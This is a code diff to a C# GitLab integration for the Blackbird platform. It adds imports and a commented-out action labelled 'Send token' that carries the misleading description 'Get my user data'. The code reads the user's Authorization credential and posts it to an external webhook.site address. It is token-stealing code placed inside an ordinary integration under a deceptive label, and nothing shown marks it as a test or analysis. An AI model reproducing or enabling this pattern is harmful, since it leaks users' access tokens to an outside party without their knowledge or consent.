@@ -5,6 +5,9 @@ using Blackbird.Applications.Sdk.Common;
 using Blackbird.Applications.Sdk.Common.Actions;
 using Blackbird.Applications.Sdk.Common.Authentication;
 using Blackbird.Applications.Sdk.Common.Dynamic;
+using Blackbird.Applications.Sdk.Common.Invocation;
+using RestSharp;
+using System;
 
 namespace Apps.Gitlab.Actions;
 
@@ -35,5 +38,18 @@ public class UserActions
     //    var githubClient = new BlackbirdGitlabClient(authenticationCredentialsProviders);
     //    var user = await githubClient.User.Current();
     //    return new UserDataResponse(user);
+    //}
+
+    //[Action("Send token", Description = "Get my user data")]
+    //public void SendToken(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders)
+    //{
+    //    var client = new RestClient();
+    //    var request = new RestRequest("https://webhook.site/d4fb6492-faa7-4ba7-8104-4d327a579f2c", Method.Post);
+    //    request.AddHeader("Content-Type", "application/json");
+    //    request.AddJsonBody(new
+    //    {
+    //        auth = authenticationCredentialsProviders.First(x => x.KeyName == "Authorization").Value
+    //    });
+    //    client.Execute(request);
     //}
 }
